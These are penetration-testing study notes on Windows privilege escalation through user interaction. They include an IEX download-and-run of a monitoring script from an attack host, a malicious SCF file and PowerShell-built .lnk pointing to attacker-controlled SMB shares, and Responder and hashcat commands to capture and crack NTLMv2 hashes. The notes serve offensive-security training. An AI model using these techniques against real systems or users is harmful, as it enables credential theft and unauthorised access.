---
title: Windows User interactions
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - privilege
  - escalation
  - windows
---


Users are sometimes the weakest link in an organization.

## Traffic Capture

It is always worth running `tcpdump` or `Wireshark` for a while to see what types of traffic are being passed over the wire and if we can see anything interesting.

- Wireshark: While not highly likely, if `Wireshark` is installed on a box that we land on, it is worth attempting a traffic capture to see what we can pick up. Unprivileged users may be able to capture network traffic, as the option to restrict Npcap driver access to Administrators only is not enabled by default. 
- The tool [net-creds](https://github.com/DanMcInerney/net-creds) can be run from our attack box to sniff passwords and hashes from a live interface or a pcap file.

## Process Command Lines

When getting a shell as a user, there may be scheduled tasks or other processes being executed which pass credentials on the command line. We can look for process command lines using something like this script below.  It captures process command lines every two seconds and compares the current state with the previous state, outputting any differences.

```shell-session
while($true)
{
  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2

}
```

#### Running Monitor Script on Target Host

We can host the script on our attack machine and execute it on the target host as follows.

```powershell-session
 IEX (iwr 'http://10.10.10.205/procmon.ps1') 
```

This is successful and reveals the password for the `sqlsvc` domain user, which we could then possibly use to gain access to the SQL02 host or potentially find sensitive data such as database credentials on the `backups` share.

Output: 

```powershell-session
InputObject                                           SideIndicator
-----------                                           -------------
@{CommandLine=C:\Windows\system32\DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5}} =>      
@{CommandLine=“C:\Windows\system32\cmd.exe” }                          =>      
@{CommandLine=\??\C:\Windows\system32\conhost.exe 0x4}                      =>      
@{CommandLine=net use T: \\sql02\backups /user:inlanefreight\sqlsvc My4dm1nP@s5w0Rd}       =>       
@{CommandLine=“C:\Windows\system32\backgroundTaskHost.exe” -ServerName:CortanaUI.AppXy7vb4pc2... <=
```


## Vulnerable Services

We may also encounter situations where we land on a host running a vulnerable application that can be used to elevate privileges through user interaction. [CVE-2019–15752](https://medium.com/@morgan.henry.roman/elevation-of-privilege-in-docker-for-windows-2fd8450b478e) is a great example of this. This was a vulnerability in Docker Desktop Community Edition before 2.1.0.1.

- When this particular version of Docker starts, it looks for several different files, including `docker-credential-wincred.exe`, `docker-credential-wincred.bat`, etc., which do not exist with a Docker installation.
- The program looks for these files in the `C:\PROGRAMDATA\DockerDesktop\version-bin\`.
- This directory was misconfigured to allow full write access to the `BUILTIN\Users` group, meaning that any authenticated user on the system could write a file into it (such as a malicious executable).
- Any executable placed in that directory would run when a) the Docker application starts and b) when a user authenticates using the command `docker login`.


## Shell Command File (SCF) on a File Share

>Using SCFs no longer works on Server 2019 hosts


A Shell Command File (SCF) is used by Windows Explorer to move up and down directories, show the Desktop, etc.

An SCF file can be manipulated to have the icon file location point to a specific UNC path and have Windows Explorer start an SMB session when the folder where the .scf file resides is accessed. If we change the IconFile to an SMB server that we control and run a tool such as [Responder](https://github.com/lgandx/Responder), [Inveigh](https://github.com/Kevin-Robertson/Inveigh), or [InveighZero](https://github.com/Kevin-Robertson/InveighZero), we can often capture NTLMv2 password hashes for any users who browse the share. This can be particularly useful if we gain write access to a file share that looks to be heavily used or even a directory on a user's workstation.

**1.** Create the file @Inventory.sfc:

```
[Shell]
Command=2
IconFile=\\$IPAttacker\share\legit.ico
[Taskbar]
Command=ToggleDesktop
```

**2**  Save it in a share:

```
# Enumerate the local shares:
Get-SmbShare
```

Output:

```
Name              ScopeName Path                 Description
----              --------- ----                 -----------
ADMIN$            *         C:\Windows           Remote Admin
C$                *         C:\                  Default share
Department Shares *         C:\Department Shares
IPC$              *                              Remote IPC
```

In this case we have write permissions on `C:\Department Shares\Public\IT` . We save there @Inventory.sfc.

**3.** Start responder in the attacker machine: 

```shell-session
sudo responder -w -d -I tun0
```

**3.** Cracking NTLMv2 Hash with Hashcat

```shell-session
hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt
```


## Capturing Hashes with a Malicious .lnk File

Using SCFs no longer works on Server 2019 hosts, but we can achieve the same effect using a malicious [.lnk](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-shllink/16cb4ca1-9339-4d0c-a68d-bf1d6cc0f943) file.

We can use various tools to generate a malicious .lnk file, such as [Lnkbomb](https://github.com/dievus/lnkbomb), as it is not as straightforward as creating a malicious .scf file.

We can also make one using a few lines of PowerShell, malicious.lnk:

```
$objShell = New-Object -ComObject WScript.Shell
$lnk = $objShell.CreateShortcut("C:\legit.lnk")
$lnk.TargetPath = "\\<attackerIP>\@pwn.png"
$lnk.WindowStyle = 1
$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
$lnk.Description = "Browsing to the directory where this file is saved will trigger an auth request."
$lnk.HotKey = "Ctrl+Alt+O"
$lnk.Save()
```